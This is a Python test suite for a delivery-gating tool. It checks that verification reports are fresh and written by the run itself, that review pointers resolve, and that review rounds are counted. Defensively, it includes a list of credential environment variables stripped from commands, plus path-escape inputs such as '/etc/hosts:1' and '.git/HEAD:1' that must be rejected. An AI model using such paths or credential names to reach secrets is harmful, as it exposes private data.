"""C5, C6: evidence a run wrote, review verdicts the gate can follow, review
rounds the CLI counts, the diff in the dossier, and tasks bound by id."""
import hashlib
import json
from pathlib import Path

from atipspec.check import check_delivery
from atipspec.errors import AtipSpecError
from atipspec.project import Project
from atipspec.trust import TrustPolicy
from tests.helpers import GuidedSteps, ProjectCase, junit_command, python_command
from tests.trust_helpers import TrustedCase

PLANTED = ('<testsuite><testcase classname="tests.test_reset" name="test_link"/>'
           '<testcase classname="tests.test_reset" name="test_unknown"/>'
           '<testcase classname="tests.test_reset" name="test_expiry"/></testsuite>')
PASSING = junit_command(PLANTED)
REPORT_PLAN = """---
scope: ["*", "src/**"]
---
# Plan

### T1: Request link

Covers: REQ-001, REQ-002
Tests: AC-001, AC-002, AC-003
Report: {report}
{proof}Verify:
- `{command}`
"""
FULL_PROOF = "Proof:\n- AC-001: test_link\n- AC-002: test_unknown\n- AC-003: test_expiry\n"


def config(root: Path, **values) -> None:
    """Set policies in config.yaml, which init wrote with every key."""
    path = root / ".atipspec/config.yaml"
    text = path.read_text()
    for key, value in values.items():
        lines = [line for line in text.splitlines() if not line.startswith(f"{key}:")]
        text = "\n".join(lines + [f"{key}: {value}"]) + "\n"
    path.write_text(text)


class ReportFreshnessTests(ProjectCase):
    def plan(self, report=".atipspec/tmp/junit.xml", command="true", proof=FULL_PROOF, accept=True):
        (self.delivery() / "plan.md").write_text(REPORT_PLAN.format(report=report, command=command, proof=proof))
        if accept:
            return self.accept("password-reset", "plan")

    def test_planted_report_is_deleted_and_fails(self):
        self.new_delivery()
        self.write_spec()
        self.plan()
        planted = self.root / ".atipspec/tmp/junit.xml"
        planted.parent.mkdir(parents=True, exist_ok=True)
        planted.write_text(PLANTED)
        code, out, err = self.run_cli("verify", "password-reset")
        self.assertEqual(code, 1, out + err)
        self.assertIn("test report not found", out)
        self.assertFalse(planted.exists(), "verify deletes the report before the commands run")
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertTrue(any("last verification failed" in e for e in report.errors), report.render())
        # Written by the command itself, the same report counts.
        self.plan(command=PASSING)
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        latest = max((self.delivery() / "evidence").glob("T1-*.json"), key=lambda path: path.stat().st_mtime)
        evidence = json.loads(latest.read_text())
        self.assertEqual(evidence["reports"][0]["fresh"], True)
        self.assertEqual(evidence["reports"][0]["path"], ".atipspec/tmp/junit.xml")

    def test_report_with_old_timestamp_is_rejected(self):
        self.new_delivery()
        self.write_spec()
        self.plan(command=junit_command('<testsuite><testcase name="test_link"/></testsuite>', age=3600))
        code, out, _ = self.run_cli("verify", "password-reset")
        self.assertEqual(code, 1)
        self.assertIn("predates this verification", out)
        evidence = json.loads(next((self.delivery() / "evidence").glob("T1-*.json")).read_text())
        self.assertEqual(evidence["result"], "fail")

    def test_report_left_as_a_link_is_rejected(self):
        self.new_delivery()
        self.write_spec()
        outside = self.root.parent / f"{self.root.name}-junit.xml"
        self.addCleanup(lambda: outside.unlink(missing_ok=True))
        self.plan(command=python_command(f"import os\nos.makedirs('.atipspec/tmp', exist_ok=True)\n"
                                         f"open({str(outside)!r}, 'w', encoding='utf-8').write({PLANTED!r})\n"
                                         f"os.symlink({str(outside)!r}, '.atipspec/tmp/junit.xml')\n"))
        code, out, _ = self.run_cli("verify", "password-reset")
        self.assertEqual(code, 1)
        self.assertIn("regular file inside the project", out)
        evidence = json.loads(next((self.delivery() / "evidence").glob("T1-*.json")).read_text())
        self.assertEqual(evidence["result"], "fail")

    def test_report_path_must_be_ignored_by_git(self):
        self.new_delivery()
        self.write_spec()
        self.assertEqual(self.plan(report="junit.xml")[0], 1, "a plan whose Report git does not ignore is not accepted")
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertTrue(any(item.level == "error" and item.source == "plan" and "must be a path git ignores" in item.text
                            for item in report.items), report.render())
        code, out, _ = self.run_cli("verify", "password-reset")
        self.assertEqual(code, 1)
        self.assertIn("must be a path git ignores", out)
        # A path git ignores, under .atipspec/tmp/, is accepted.
        self.assertEqual(self.plan()[0], 0)

    def test_tracked_report_is_named_as_tracked(self):
        self.new_delivery()
        self.write_spec()
        self.plan(command=PASSING)
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        self.git("add", "-f", ".atipspec/tmp/junit.xml")
        self.commit("planted report")
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertTrue(any("is tracked by git" in e and "git rm --cached .atipspec/tmp/junit.xml" in e
                            for e in report.errors), report.render())
        code, out, _ = self.run_cli("verify", "password-reset")
        self.assertEqual(code, 1)
        self.assertIn("is tracked by git", out)
        latest = max((self.delivery() / "evidence").glob("T1-*.json"), key=lambda path: path.stat().st_mtime)
        self.assertEqual(json.loads(latest.read_text())["result"], "fail", "a committed copy never passes for a run")

    def test_evidence_without_fresh_marker_asks_to_verify_again(self):
        self.new_delivery()
        self.write_spec()
        self.plan(command=PASSING)
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        path = next((self.delivery() / "evidence").glob("T1-*.json"))
        data = json.loads(path.read_text())
        del data["reports"][0]["fresh"]
        path.write_text(json.dumps(data))
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertTrue(any("predates the report freshness check" in t for t in report.todos), report.render())
        self.assertFalse(report.errors, report.render())


class CommandEnvironmentTests(ProjectCase):
    def test_verify_commands_get_no_credentials(self):
        from unittest.mock import patch
        from atipspec.verify import run_command
        names = ("SSH_AUTH_SOCK", "CI_JOB_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "GIT_ASKPASS", "GITHUB_TOKEN",
                 "ATIPSPEC_TRUST_POLICY", "KEPT")
        script = python_command(f"import os\nprint(sorted(name for name in os.environ if name in {names!r}))")
        with patch.dict("os.environ", {name: "set" for name in names}):
            result = run_command(script, self.root, 60)
        self.assertEqual(result["output_tail"].strip(), "['KEPT']", "an approver's SSH agent signs with their key")


class FreshAttestationTests(TrustedCase):
    def test_attest_refuses_a_report_without_fresh_marker(self):
        from atipspec.assurance import attest
        self.write_contract('require-command "true"')
        self.commit("accepted architecture")
        self.new_delivery()
        self.write_spec()
        (self.delivery() / "plan.md").write_text(REPORT_PLAN.format(report=".atipspec/tmp/junit.xml",
                                                                    command=PASSING, proof=FULL_PROOF))
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        path = next((self.delivery() / "evidence").glob("T1-*.json"))
        data = json.loads(path.read_text())
        del data["reports"][0]["fresh"]
        path.write_text(json.dumps(data))
        with self.assertRaises(AtipSpecError) as caught:
            attest(self.project, "password-reset", self.policy, "ci", self.keys["ci"], "https://ci.example/runs/9")
        self.assertIn("predates the report freshness check", str(caught.exception))


class ProofPolicyTests(GuidedSteps, ProjectCase):
    def final_plan(self, proof=""):
        (self.delivery() / "plan.md").write_text(f"""---
scope: ["*", "src/**"]
---
# Plan
## Tasks
### T1: Request link
Covers: REQ-001
Tests: AC-001, AC-002
### T2: Expiry
Covers: REQ-002
Tests: AC-003
## Final verification
Report: .atipspec/tmp/junit.xml
{proof}Verify:
- `{PASSING}`
""")

    def test_require_proof_blocks_the_proposal_until_tests_are_named(self):
        self.prepare()
        config(self.root, require_proof="true")
        self.final_plan()
        report = check_delivery(Project.find(self.root), "password-reset", preapproval=True)
        for ident in ("AC-001", "AC-002", "AC-003"):
            self.assertTrue(any(f"{ident}: require_proof is on" in e for e in report.errors), report.render())
        self.assertEqual(self.accept("password-reset", "proposal")[0], 1)
        self.assertIn("each criterion under Tests names its test in Proof (require_proof)",
                      self.run_cli("proposal", "password-reset")[1])
        self.final_plan(FULL_PROOF)
        code, out, err = self.accept("password-reset", "proposal")
        self.assertEqual(code, 0, out + err)
        # Without the Report, the proof has nothing to come from.
        path = self.delivery() / "plan.md"
        path.write_text(path.read_text().replace("Report: .atipspec/tmp/junit.xml\n", ""))
        report = check_delivery(Project.find(self.root), "password-reset", preapproval=True)
        self.assertTrue(any("Final verification: require_proof is on" in e for e in report.errors), report.render())

    def test_proof_matching_several_cases_needs_all_passed(self):
        self.prepare()
        writer = junit_command('<testsuite><testcase classname="tests.a" name="test_link"/>'
                               '<testcase classname="tests.b" name="test_link"><skipped/></testcase></testsuite>')
        (self.delivery() / "plan.md").write_text(REPORT_PLAN.format(
            report=".atipspec/tmp/junit.xml", command=writer, proof="Proof:\n- AC-001: test_link\n"))
        self.approve()
        self.run_cli("verify", "password-reset")
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertTrue(any("AC-001: the named test test_link skipped" in e for e in report.errors), report.render())


class TrustedProofTests(TrustedCase):
    def test_trust_policy_imposes_require_proof(self):
        self.write_contract('require-command "true"')
        self.commit("accepted architecture")
        self.new_delivery()
        self.write_spec()
        self.write_plan()
        text = self.policy_path.read_text()
        self.policy_path.write_text(text.replace("contract_rules", "require_proof = true\ncontract_rules", 1))
        policy = TrustPolicy.load(self.policy_path, self.root)
        project = Project.find(self.root)
        self.assertFalse(project.requirement("require_proof"))
        self.assertTrue(project.requirement("require_proof", policy))
        report = check_delivery(project, "password-reset", policy=policy)
        self.assertTrue(any("AC-001: require_proof is on" in e for e in report.errors), report.render())
        self.assertFalse(any("require_proof" in e for e in check_delivery(project, "password-reset").errors))
        self.policy_path.write_text(text.replace("contract_rules", 'require_proof = "yes"\ncontract_rules', 1))
        with self.assertRaisesRegex(AtipSpecError, "require_proof must be true or false"):
            TrustPolicy.load(self.policy_path, self.root)


class PointerTests(ProjectCase):
    def test_resolve_forms(self):
        from atipspec.pointers import resolve
        project = Project.find(self.root)
        (self.root / "app.py").write_text("a = 1\nb = 2\n")
        (self.root / "tests").mkdir()
        (self.root / "tests/test_a.py").write_text("def test_b(x):\n    assert x\n")
        (self.root / "link.py").symlink_to(self.root / "app.py")
        folder = self.root / ".atipspec/deliveries/x"
        (folder / "evidence/logs").mkdir(parents=True)
        (folder / "evidence/logs/FINAL-1-1.log").write_text("ok\n12 passed\n")
        cases = [{"id": "tests.test_pricing.test_save10", "name": "test_save10", "classname": "tests.test_pricing",
                  "status": "passed"},
                 {"id": "Pricing applies SAVE10", "name": "Pricing applies SAVE10", "classname": "", "status": "passed"},
                 {"id": "tests.test_pricing.test_bad", "name": "test_bad", "classname": "tests.test_pricing",
                  "status": "failed"}]
        (folder / "spec.md").write_text("# x\n")
        (self.root / ".atipspec/tmp").mkdir(parents=True, exist_ok=True)
        (self.root / ".atipspec/tmp/packet.md").write_text("a\nb\n")
        (self.root / "ignored.log").write_text("a\n")
        # A project that ignores logs still has its evidence logs to point to.
        (self.root / ".gitignore").write_text((self.root / ".gitignore").read_text() + "*.log\n")
        for text in ("ok", "proof", "app.py:99", "app.py:0", "missing.py:1", "../x:1", "link.py:1", "test_bad",
                     "tests/test_a.py::test_missing", "/etc/hosts:1", "tests/test_a.py::test", "spec.md:1",
                     ".atipspec/deliveries/x/spec.md:1", ".atipspec/tmp/packet.md:2", "ignored.log:1",
                     ".git/HEAD:1", ".GIT/HEAD:1", ".ATIPSPEC/deliveries/x/spec.md:1", ".Atipspec/tmp/packet.md:2",
                     "a" * 300 + ".py:1", "a" * 300 + ".py::test_b"):
            self.assertIsNone(resolve(project, text, cases, folder), text)
        for text, expected in (("app.py:2", "file app.py:2"), ("see app.py:1-2.", "file app.py:1-2"),
                               ("(app.py:1)", "file app.py:1"),
                               ("tests/test_a.py::test_b[x]", "name test_b[x] found in tests/test_a.py"),
                               ("`Pricing applies SAVE10`", "test Pricing applies SAVE10 passed"),
                               ("tests.test_pricing.test_save10 covers it", "test tests.test_pricing.test_save10 passed"),
                               ("evidence/logs/FINAL-1-1.log:2", "file evidence/logs/FINAL-1-1.log:2"),
                               (".atipspec/deliveries/x/evidence/logs/FINAL-1-1.log:1",
                                "file .atipspec/deliveries/x/evidence/logs/FINAL-1-1.log:1")):
            self.assertEqual(resolve(project, text, cases, folder), expected, text)

    def test_a_pointer_keeps_its_leading_dot(self):
        from atipspec.delivery import parse_review
        from atipspec.pointers import resolve
        self.assertEqual(parse_review("- AC-001: PASS. .atipspec/config.yaml:1").verdicts["AC-001"],
                         ("PASS", ".atipspec/config.yaml:1"))
        self.assertEqual(parse_review("- AC-001: PASS... ok").verdicts["AC-001"], ("PASS", "ok"))
        (self.root / ".hidden.py").write_text("x = 1\n")
        self.assertEqual(resolve(Project.find(self.root), ".hidden.py:1", []), "file .hidden.py:1")
        self.assertIsNone(resolve(Project.find(self.root), ".atipspec/config.yaml:1", []),
                          "AtipSpec's own records are not the candidate's proof")

    def test_gate_rejects_unresolvable_pass_and_requires_reviewer(self):
        self.new_delivery()
        self.write_spec(accept=False)
        spec = self.delivery() / "spec.md"
        spec.write_text(spec.read_text().replace("- AC-003:", "- AC-003 [manual]:"))
        self.accept("password-reset", "spec")
        (self.delivery() / "plan.md").write_text(
            "---\nscope: [\"*\", \"src/**\"]\n---\n# Plan\n\n### T1: Link\n\nCovers: REQ-001\nTests: AC-001, AC-002\n"
            "Verify:\n- `true`\n\n### T2: Expiry\n\nCovers: REQ-002\nManual: AC-003\nVerify: none\n")
        self.accept("password-reset", "plan")
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        project = Project.find(self.root)
        review = self.delivery() / "review.md"

        def write(v1, v2, v3, reviewer="reviewer: r\n"):
            review.write_text(f"---\ntree: {project.fingerprint()}\n{reviewer}session: isolated\n---\n"
                              f"- AC-001: PASS. {v1}\n- AC-002: PASS. {v2}\n- AC-003: PASS. {v3}\n")
            return check_delivery(project, "password-reset").errors

        errors = write("ok", "ok", "ok")
        for ident in ("AC-001", "AC-002", "AC-003"):
            self.assertTrue(any(e.startswith(f"{ident} PASS points to nothing") for e in errors), errors)
        errors = write("README.md:1", "`README.md:1`", "Opened the link page, saw link expired")
        self.assertFalse(any("PASS points to nothing" in e for e in errors), errors)
        errors = write("README.md:1", "Opened the link page, saw link expired", "README.md:1")
        self.assertTrue(any(e.startswith("AC-002 PASS points to nothing") for e in errors), "an observation is only for manual criteria")
        errors = write("README.md:1", "README.md:1", "README.md:1", reviewer="")
        self.assertTrue(any("needs `reviewer:`" in e for e in errors), errors)


class StalePointerTests(GuidedSteps, ProjectCase):
    def test_a_test_pointer_waits_for_current_evidence(self):
        self.prepare()
        (self.delivery() / "plan.md").write_text(REPORT_PLAN.format(report=".atipspec/tmp/junit.xml", command=PASSING,
                                                                    proof=""))
        self.approve()
        self.assertEqual(self.run_cli("task-done", "password-reset", "T1", "--note", "Implemented the link")[0], 0)
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        project = Project.find(self.root)
        self.write_review(project.fingerprint())
        review = self.delivery() / "review.md"
        review.write_text(review.read_text().replace("- AC-001: PASS. README.md:1", "- AC-001: PASS. test_link"))
        self.assertEqual(check_delivery(project, "password-reset").status, "checked")
        (self.root / "README.md").write_text("# demo\nchanged\n")
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertFalse(any("points to nothing" in item.text for item in report.items), report.render())
        self.assertIn("evidence is stale", report.next_action)
        # With the review current and the evidence not, the pointer waits as a todo.
        self.write_review(Project.find(self.root).fingerprint())
        review.write_text(review.read_text().replace("- AC-001: PASS. README.md:1", "- AC-001: PASS. test_link"))
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertTrue(any("AC-001 PASS points to nothing" in t for t in report.todos), report.render())
        self.assertFalse(any("points to nothing" in e for e in report.errors), report.render())
        self.assertIn("evidence is stale", report.next_action)
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        self.assertFalse(any("points to nothing" in item.text
                             for item in check_delivery(Project.find(self.root), "password-reset").items))


class ProofPointerTests(GuidedSteps, ProjectCase):
    def test_a_pass_that_ignores_the_proof_test_is_a_warning(self):
        self.prepare()
        (self.delivery() / "plan.md").write_text(REPORT_PLAN.format(report=".atipspec/tmp/junit.xml", command=PASSING,
                                                                    proof=FULL_PROOF))
        self.approve()
        self.assertEqual(self.run_cli("task-done", "password-reset", "T1", "--note", "Implemented the link")[0], 0)
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        project = Project.find(self.root)
        self.write_review(project.fingerprint())
        review = self.delivery() / "review.md"
        review.write_text(review.read_text().replace("- AC-002: PASS. README.md:1", "- AC-002: PASS. test_unknown")
                          .replace("- AC-003: PASS. README.md:1", "- AC-003: PASS. `tests.test_reset::test_expiry`"))
        report = check_delivery(project, "password-reset")
        self.assertEqual(report.status, "checked", report.render())
        self.assertEqual([text for text in report.of("warning") if "the test its Proof names" in text],
                         ["AC-001 PASS points to 'README.md:1', not to test_link, the test its Proof names: point to "
                          "that test, or say why another proof holds"], "a resolved pointer is not the criterion's proof")


class ReviewSessionTests(GuidedSteps, ProjectCase):
    def test_shared_session_warns_and_blocks_high_risk_or_policy(self):
        self.prepare()
        self.shared_plan()
        self.approve()
        self.complete()
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        review = self.delivery() / "review.md"

        def check(session):
            self.write_review(self.project.fingerprint())
            text = review.read_text().replace("session: isolated\n", session)
            review.write_text(text)
            return check_delivery(Project.find(self.root), "password-reset")

        report = check("")
        self.assertEqual(report.exit_code, 0, report.render())
        self.assertTrue(any("declares no session, so it counts as shared" in w for w in report.of("warning")))
        report = check("session: shared\n")
        self.assertEqual(report.exit_code, 0, report.render())
        self.assertTrue(any("says session: shared" in w for w in report.of("warning")))
        report = check("session: isolated\n")
        self.assertFalse(any("session" in w for w in report.of("warning")), report.render())
        report = check("session: maybe\n")
        self.assertTrue(any("session must be isolated or shared, found 'maybe'" in e for e in report.errors))
        config(self.root, require_isolated_review="true")
        report = check("session: shared\n")
        self.assertTrue(any("require_isolated_review requires it" in e for e in report.errors), report.render())
        config(self.root, require_isolated_review="false")
        spec = self.delivery() / "spec.md"
        spec.write_text(spec.read_text().replace("created: 2026-09-12", "created: 2026-09-12\nrisk: high"))
        # risk: high also names the test of every criterion under Tests.
        plan = self.delivery() / "plan.md"
        plan.write_text(plan.read_text().replace("Verify:\n- `true`\n", "Report: .atipspec/tmp/junit.xml\n" + FULL_PROOF
                                                 + "Verify:\n- `" + PASSING + "`\n"))
        self.approve()
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        report = check("session: shared\n")
        self.assertTrue(any("risk: high requires it" in e for e in report.errors), report.render())
        report = check("session: isolated\n")
        self.assertFalse(any("session" in e for e in report.errors), report.render())


class GuidedCase(ProjectCase):
    """A guided delivery (schema 2) with its canonical spec bound and a final verification."""

    def guided(self, review_rounds=None):
        self.new_delivery()
        project = Project.find(self.root)
        project.tmp.mkdir(parents=True, exist_ok=True)
        source = project.tmp / "auth.md"
        source.write_text("# Greeting\n### REQ-001: Greeting\n#### AC-001: Spanish greeting\n"
                          "- WHEN greeting is requested\n- THEN the result is Hola\n")
        self.assertEqual(self.run_cli("spec-bind", "password-reset", "--file", str(source))[0], 0)
        (self.delivery() / "plan.md").write_text("---\nscope: [\"*\"]\n---\n# Plan\n## Tasks\n### T1: Greeting\n"
                                                  "Covers: REQ-001\nTests: AC-001\n\n## Final verification\n"
                                                  "Verify:\n- `true`\n")
        if review_rounds is not None:
            config(self.root, review_rounds=review_rounds)
        self.approve()
        self.done()
        return Project.find(self.root)

    def approve(self):
        code, out, err = self.accept("password-reset", "proposal", by="human")
        self.assertEqual(code, 0, out + err)

    def done(self):
        code, out, err = self.run_cli("task-done", "password-reset", "T1", "--note", "Implemented the greeting")
        self.assertEqual(code, 0, out + err)

    def verify(self):
        code, out, err = self.run_cli("verify", "password-reset")
        self.assertEqual(code, 0, out + err)

    def review(self, verdict="PASS", session="isolated"):
        project = Project.find(self.root)
        (self.delivery() / "review.md").write_text(
            f"---\ntree: {project.fingerprint()}\nreviewer: subagent\nsession: {session}\n---\n"
            f"- AC-001: {verdict}. README.md:1\n")


class ReviewRoundsTests(GuidedCase):
    def test_review_refuses_after_limit_and_resets_on_new_agreement(self):
        project = self.guided(review_rounds=2)
        self.verify()
        code, out, err = self.run_cli("review", "password-reset")
        self.assertEqual(code, 0, out + err)
        self.assertIn("review 1 of 2", out)
        self.assertFalse(any("stale" in t for t in check_delivery(project, "password-reset").todos),
                         "writing review-rounds.json leaves the evidence current")
        self.review("FAIL")
        (self.root / "app.py").write_text("print('one')\n")
        self.verify()
        code, out, err = self.run_cli("review", "password-reset")
        self.assertEqual(code, 0, out + err)
        self.assertIn("review 2 of 2", out)
        self.review("FAIL")
        (self.root / "app.py").write_text("print('two')\n")
        self.verify()
        code, out, err = self.run_cli("review", "password-reset")
        self.assertEqual(code, 1)
        self.assertIn("review 2 of 2 was the last, and the candidate changed after it", err)
        self.assertIn("review 2 of 2", self.run_cli("status", "password-reset")[1])
        # More rounds change config.yaml, so the proposal is approved again and the count restarts.
        config(self.root, review_rounds=4)
        self.assertEqual(self.run_cli("review", "password-reset")[0], 1)
        self.approve()
        self.done()
        self.verify()
        code, out, err = self.run_cli("review", "password-reset")
        self.assertEqual(code, 0, out + err)
        self.assertIn("review 1 of 4", out)

    def test_regenerating_packet_without_changes_is_not_a_round(self):
        self.guided()
        self.verify()
        self.assertEqual(self.run_cli("review", "password-reset")[0], 0)
        self.review("FAIL")
        for _ in range(3):
            code, out, err = self.run_cli("review", "password-reset")
            self.assertEqual(code, 0, out + err)
            self.assertIn("review 1 of 3", out)
        self.assertIn("review 1 of 3", self.run_cli("status", "password-reset")[1])

    def test_used_up_rounds_reach_check_and_report(self):
        from atipspec.reporting import render_report, report_data
        self.guided(review_rounds=2)
        data = report_data(Project.find(self.root), "password-reset")
        self.assertIsNone(data["review_rounds"], "the proposal's approval starts the count, but counts no review")
        self.assertNotIn("Revisión 0", render_report(data, "markdown"))
        for round_, change in ((1, "one"), (2, "two")):
            self.verify()
            code, out, err = self.run_cli("review", "password-reset")
            self.assertIn(f"review {round_} of 2", out, err)
            self.review("FAIL")
            (self.root / "app.py").write_text(f"print('{change}')\n")
        self.verify()
        self.assertEqual(self.run_cli("review", "password-reset")[0], 1)
        # A review written without a packet does not make the count go away.
        (self.root / "app.py").write_text("print('three')\n")
        self.verify()
        self.review("PASS")
        project = Project.find(self.root)
        report = check_delivery(project, "password-reset")
        self.assertEqual(report.status, "implemented", report.render())
        self.assertTrue(report.errors[0].startswith("review rounds are used up: review 2 of 2 was the last, and the "
                                                    "candidate changed after it"), report.render())
        out = self.run_cli("ship", "password-reset")[1]
        self.assertTrue(out.startswith("Ship password-reset: stop, the next decision is the user's\n  because: review "
                                       "rounds are used up"), out)
        self.assertNotIn("Run: atipspec build", out, "ship does not send the assistant back to change the code")
        (self.delivery() / "review.md").unlink()
        self.assertFalse([text for text in check_delivery(project, "password-reset").todos if "No review.md" in text],
                         "check does not ask for the review that `review` refuses")
        self.review("PASS")
        data = report_data(project, "password-reset")
        self.assertNotIn("approval_code", data)
        self.assertEqual(data["review_rounds"], {"used": 2, "limit": 2})
        self.assertIn("Revisión 2 de 2.", render_report(data, "markdown"))
        # Raising the limit is a new agreement: once approved, the count starts again.
        config(self.root, review_rounds=3)
        self.approve()
        self.done()
        self.verify()
        self.assertEqual(self.run_cli("review", "password-reset")[0], 0)
        self.review("PASS")
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertEqual(report.status, "checked", report.render())
        self.assertEqual(report_data(Project.find(self.root), "password-reset")["review_rounds"],
                         {"used": 1, "limit": 3})

    def test_every_changed_candidate_is_a_round_whatever_review_md_says(self):
        from atipspec.reporting import report_data
        self.guided()
        self.verify()
        self.assertIn("review 1 of 3", self.run_cli("review", "password-reset")[1])
        # A review that passed counts too: the candidate changed after it.
        self.review("PASS")
        (self.root / "app.py").write_text("print('one')\n")
        self.verify()
        self.assertIn("review 2 of 3", self.run_cli("review", "password-reset")[1])
        # The reviewer's FAIL turned into a PASS after the correction.
        self.review("FAIL")
        review = self.delivery() / "review.md"
        review.write_text(review.read_text().replace("AC-001: FAIL.", "AC-001: PASS."))
        (self.root / "app.py").write_text("print('two')\n")
        self.verify()
        self.assertIn("review 3 of 3", self.run_cli("review", "password-reset")[1])
        # A review of the last packet with no verdicts at all.
        self.review("FAIL")
        tree = json.loads((self.delivery() / "review-rounds.json").read_text())["packet_tree"]
        review.write_text(f"---\ntree: {tree}\n---\n")
        (self.root / "app.py").write_text("print('three')\n")
        self.verify()
        code, out, err = self.run_cli("review", "password-reset")
        self.assertEqual(code, 1)
        self.assertIn("review 3 of 3 was the last, and the candidate changed after it", err)
        # Asking again counts nothing more.
        self.assertEqual(self.run_cli("review", "password-reset")[0], 1)
        self.assertIn("review 3 of 3", self.run_cli("status", "password-reset")[1])
        self.review("PASS")
        project = Project.find(self.root)
        report = check_delivery(project, "password-reset")
        self.assertEqual(report.status, "implemented", report.render())
        self.assertTrue(report.blocking(("rounds",)), report.render())
        self.assertNotIn("approval_code", report_data(project, "password-reset"))

    def test_a_packet_that_cannot_be_built_counts_no_round(self):
        from unittest import mock
        self.guided()
        self.verify()
        self.assertEqual(self.run_cli("review", "password-reset")[0], 0)
        self.review("FAIL")
        for change in ("one", "two", "three"):
            (self.root / "app.py").write_text(f"print('{change}')\n")
            self.verify()
            with mock.patch("atipspec.review.build_packet", side_effect=AtipSpecError("cannot read the diff")):
                code, out, err = self.run_cli("review", "password-reset")
            self.assertEqual(code, 1)
            self.assertIn("cannot read the diff", err)
        self.assertIn("review 1 of 3", self.run_cli("status", "password-reset")[1])
        self.assertIn("review 2 of 3", self.run_cli("review", "password-reset")[1])

    def test_legacy_used_up_rounds_say_no_approval_covers_the_limit(self):
        from atipspec.rounds import used_up
        self.new_delivery()
        self.write_spec(status="draft", accept=False)
        spec = self.delivery() / "spec.md"
        spec.write_text(spec.read_text().replace("capability: auth", "kind: fix\ncapability: auth"))
        project = Project.find(self.root)
        last = {"rounds": 3, "packet_tree": "0" * 40}
        self.assertIsNone(used_up(project, "password-reset", dict(last, rounds=2), project.fingerprint()))
        refusal = used_up(project, "password-reset", last, project.fingerprint())
        self.assertIn("They decide: change the spec, raise review_rounds in .atipspec/config.yaml (no approval "
                      "covers it in a legacy delivery: raise it only on their word)", refusal)

    def test_a_review_of_a_packet_never_counted_is_not_taken(self):
        from atipspec.reporting import report_data
        self.guided(review_rounds=2)
        self.verify()
        # A review written without `atipspec review` waits for its packet.
        self.review("PASS")
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertEqual(report.status, "implemented", report.render())
        self.assertTrue(any(t.startswith("review.md is not the review of the last packet `atipspec review` counted")
                            for t in report.todos), report.render())
        # The packet for the same candidate counts nothing, and the review stands.
        self.assertIn("review 1 of 2", self.run_cli("review", "password-reset")[1])
        self.assertEqual(check_delivery(Project.find(self.root), "password-reset").status, "checked")
        self.review("FAIL")
        (self.root / "app.py").write_text("print('one')\n")
        self.verify()
        self.assertIn("review 2 of 2", self.run_cli("review", "password-reset")[1])
        self.review("FAIL")
        # The last round failed; skipping `review` after the correction does not let a review through.
        (self.root / "app.py").write_text("print('two')\n")
        self.verify()
        self.review("PASS")
        project = Project.find(self.root)
        report = check_delivery(project, "password-reset")
        self.assertEqual(report.status, "implemented", report.render())
        self.assertTrue(any(t.startswith("review.md is not the review of the last packet") for t in report.todos),
                        report.render())
        self.assertNotIn("approval_code", report_data(project, "password-reset"))
        code, out, err = self.run_cli("review", "password-reset")
        self.assertEqual(code, 1)
        self.assertIn("review 2 of 2 was the last, and the candidate changed after it", err)

    def use_up_one_round(self):
        self.guided(review_rounds=2)
        self.assertTrue((self.delivery() / "review-rounds.json").is_file(), "accepting the proposal starts the count")
        self.assertNotRegex(self.run_cli("status", "password-reset")[1], r"(?m)^review \d+ of \d+$")
        for round_, change in ((1, "one"), (2, "two")):
            self.verify()
            self.assertIn(f"review {round_} of 2", self.run_cli("review", "password-reset")[1])
            self.review("FAIL")
            (self.root / "app.py").write_text(f"print('{change}')\n")
        self.verify()
        self.assertEqual(self.run_cli("review", "password-reset")[0], 1)
        (self.delivery() / "review-rounds.json").unlink()

    def test_a_deleted_count_is_refused_where_the_proposal_started_it(self):
        self.use_up_one_round()
        code, out, err = self.run_cli("review", "password-reset")
        self.assertEqual(code, 1, out + err)
        self.assertIn("the review round count is missing: `atipspec accept password-reset proposal` started", err)
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertTrue(any(text.startswith("the review round count is missing") for text in report.errors),
                        report.render())
        self.approve()
        self.assertIn("review 1 of 2", self.run_cli("review", "password-reset")[1],
                      "the human's new approval starts a new count")

    def test_a_delivery_from_before_0_3_counts_its_reviews_from_the_first_packet_after_the_update(self):
        from unittest import mock
        self.guided(review_rounds=2)
        self.verify()
        # A delivery created before 0.3.0: its baseline names no sections, no approval started its count, and
        # 0.2.x wrote its review of this same candidate with the tree of a fingerprint that kept the task titles.
        project = Project.find(self.root)
        earlier = project.git.fingerprint(project._excluded())
        self.assertNotEqual(earlier, project.fingerprint())
        (self.delivery() / "review-rounds.json").unlink()
        (self.delivery() / "review.md").write_text(f"---\ntree: {earlier}\nreviewer: subagent\n---\n"
                                                   "- AC-001: FAIL. README.md:1\n")
        with mock.patch("atipspec.specs.baseline_sections", return_value=set()):
            code, out, err = self.run_cli("review", "password-reset")
            self.assertEqual(code, 0, out + err)
            self.assertIn("review 1 of 2", out, "the review of a tree the fingerprint never gives is not counted")
            self.review("FAIL")
            (self.root / "app.py").write_text("print('one')\n")
            self.verify()
            self.assertIn("review 2 of 2", self.run_cli("review", "password-reset")[1])

    def test_renaming_a_task_is_not_a_round(self):
        self.guided()
        self.verify()
        self.assertEqual(self.run_cli("review", "password-reset")[0], 0)
        self.review("PASS")
        plan = self.delivery() / "plan.md"
        plan.write_text(plan.read_text().replace("### T1: Greeting", "### T1: Spanish greeting"))
        self.assertIn("review 1 of 3", self.run_cli("review", "password-reset")[1])
        self.assertEqual(check_delivery(Project.find(self.root), "password-reset").status, "checked")
